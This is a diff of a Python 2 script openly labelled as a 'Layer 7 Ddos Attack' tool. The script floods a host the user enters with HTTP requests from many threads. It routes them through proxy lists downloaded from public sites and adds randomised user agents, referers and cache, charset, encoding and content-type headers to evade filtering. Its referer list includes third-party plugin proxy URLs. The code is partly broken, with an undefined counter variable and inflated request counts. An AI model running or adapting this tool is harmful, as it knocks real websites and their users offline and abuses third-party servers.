@@ -2,7 +2,9 @@
 #!/usr/bin/env python2
 #Coded By P3terJ4mes
 import os
+import re
 import sys
+import socket
 import urllib
 import random
 import httplib
@@ -10,7 +12,24 @@ import urllib2
 import datetime
 import requests
 import threading
+print \
+"""
+            --------- _       _____   ______    _           _      
+            ---  ----! !     ! ____! ! _____!  ! ! _______ ! !
+               ! !   ! !____ ! !___  ! !   ___ ! !!  ___  !! !
+               ! !   !  __  !! ____! ! !  !___!! !! !   ! !! !  
+               ! !   ! !  ! !! !___  ! !____!! ! !! !___! !! !  
+               !_!   !_!  !_!!_____! !______!! !_!!_______!!_!Ddos Layer.7                                        
 
+  !_________________________________________________________________________!
+"""
+print("   ========>>.:.Hello P3terJ4mes,Welcome Ddos Attack2019 WEBSITE.:.<<========")
+print("")
+
+if os.name in ('nt', 'dos', 'ce'):
+    os.system('title       ........::::: Code By Thunder(P3terJ4mes),Layer 7 Ddos Attack :::::........')
+    os.system('color 0A')
+    
 Close = False
 Lock = threading.Lock()
 request_counter = 0
@@ -20,7 +39,7 @@ headers_referers= []
 def getUserAgent():
     platform = random.choice(['Macintosh', 'Windows', 'X11'])
     if platform == 'Macintosh':
-        os  = random.choice(['68K', 'PPC','Intel Mac OS X 10.8.2 Mountain Lion','Intel Mac OS X 10.9 Marvericks','Intel Mac OS X 10.10 Yosemite','Intel Mac OS X 10.11 El Capitan','Intel Mac OS 10.12 Sierra'])
+        os  = random.choice(['68K', 'PPC', 'Intel Mac OS X 10.8.2 Mountain Lion','Intel Mac OS X 10.9 Marvericks','Intel Mac OS X 10.10 Yosemite','Intel Mac OS X 10.11 El Capitan','Intel Mac OS 10.12 Sierra'])
     elif platform == 'Windows':
         os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8','Windows 10'])
     elif platform == 'X11':
@@ -1265,7 +1284,7 @@ def referer_list():
         headers_referers.append('http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=')
         headers_referers.append('http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
         headers_referers.append('http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=')
-        headers_referers.append('http://' + url + '/')
+        headers_referers.append('http://' + host_url + '/')
         return(headers_referers)
     except MemoryError:
                 print("[Root@Kali://P3terJ4mes>Memory not open specified url.\n")
@@ -1280,6 +1299,38 @@ def buildLock(size):
 	code = random.choice(validChars)
 	out_str += chr(code)
     return(out_str)
+       
+def noCache():
+    #Random no-cache entries:
+    noCacheDirectives = ['no-cache', 'max-age=0']
+    random.shuffle(noCacheDirectives)
+    nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
+    noCache = ', '.join(noCacheDirectives[:nrNoCache])
+    return(noCache)
+
+def acceptCharset():
+    #Random accept-charset:
+    acceptCharset = ['ISO-8859-1','utf-8;q=0.7','*;q=0.7','Windows-1251','ISO-8859-2','ISO-8859-15', ]
+    random.shuffle(acceptCharset)
+    nrCharset = random.randint(1,(len(acceptCharset)-1))
+    noCharset = ', '.join(acceptCharset[:nrCharset])
+    return(noCharset)
+   
+def acceptEncoding():
+    #Random accept encoding:
+    acceptEncoding = ['\'\'','*','identity','gzip','deflate']
+    random.shuffle(acceptEncoding)
+    nrEncodings = random.randint(1,len(acceptEncoding)/2)
+    roundEncodings = acceptEncoding[:nrEncodings]
+    return(roundEncodings)
+
+def contentType():
+    #Random Content-Type:
+    contentType = ['multipart/form-data', 'application/x-url-encoded']
+    random.shuffle(contentType)
+    nrContentType = random.randint(1,len(contentType)/2)
+    roundContentType = contentType[:nrContentType]
+    return(roundContentType)
 
 class Requested(threading.Thread):
     def run(self):
@@ -1296,11 +1347,14 @@ class Requested(threading.Thread):
                 request.add_header("Referer", random.choice(headers_referers))
                 request.add_header('Keep-Alive', random.randint(110,120))
 	        request.add_header('Connection', 'keep-alive')
-	        request.add_header('Cache-Control', 'no-cache')
-	        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	        index_proxy = random.randint(0,len(listaproxy)-1)
-                proxy_server = urllib2.ProxyHandler({'http':listaproxy[index_proxy]})
-                opener = urllib2.build_opener(proxy_server,urllib2.HTTPHandler)
+	        request.add_header('Cache-Control',random.choice(noCache()))
+	        request.add_header('Accept-Charset', random.choice(acceptCharset()))
+	        request.add_header('Accept-Encoding', random.choice(acceptEncoding()))
+	        request.add_header('Content-Type',random.choice(contentType()))
+	        request.add_header('Host',host_url)
+                index = random.randint(0,len(listaproxy)-1)
+                proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
+                opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
                 urllib2.install_opener(opener)
                 urllib2.urlopen(request)
                 request_counter += 1203
@@ -1308,7 +1362,7 @@ class Requested(threading.Thread):
                 status = response.status_code
                 Lock.acquire()
                 print("[Root@Kali://P3terJ4mes>Status Server {} ").format(status)
-                print("[Root@Kali://P3terJ4mes>Layer 7 Attack with Proxy [--{}--] ").format(listaproxy[index_proxy])
+                print("[Root@Kali://P3terJ4mes>Requests Server {} stated !!!\n").format(listaproxy[index])
                 print("[Root@Kali://P3terJ4mes>Requests Server {} stated !!!\n").format(request_counter)
                 print("[Root@Kali://P3terJ4mes>Requests Server {} stated !!!\n").format(Request_counter/5.0)
                 Lock.release()
@@ -1332,33 +1386,15 @@ class Requested(threading.Thread):
             except KeyboardInterrupt:
                 exit("[Root@Kali://P3terJ4mes>Canceled By P3terJ4mes\n")
                 sys.exit()
-        
-print \
-"""
-            --------- _       _____   ______    _           _      
-            ---  ----! !     ! ____! ! _____!  ! ! _______ ! !
-               ! !   ! !____ ! !___  ! !   ___ ! !!  ___  !! !
-               ! !   !  __  !! ____! ! !  !___!! !! !   ! !! !  
-               ! !   ! !  ! !! !___  ! !____!! ! !! !___! !! !  
-               !_!   !_!  !_!!_____! !______!! !_!!_______!!_!Ddos Layer.7                                        
 
-  !_________________________________________________________________________!
-"""
-print("   ========>>.:.Hello P3terJ4mes,Welcome Ddos Attack2019 WEBSITE.:.<<========")
-print("")
-
-if os.name in ('nt', 'dos', 'ce'):
-    os.system('title       ........::::: Code By Thunder(P3terJ4mes),Layer 7 Ddos Attack :::::........')
-    os.system('color 0A')
-    
 url = raw_input('[Root@Kali://P3terJ4mes>Host :')
-url.replace("https://", "").replace("http://", "").replace("www.", "")
 try:
    in_file = urllib.urlopen('http://multiproxy.org/txt_all/proxy.txt','http://spys.me/proxy.txt')
    listaproxy = in_file.readlines()
 except IOError:
        print("[Root@Kali://P3terJ4mes>Could not open specified Proxy Url.\n")
 while Close == False:
+    host_url = url.replace("https://", "").replace("http://", "").replace("www.", "")
     try:
         Garena = Requested()
         Garena.start()
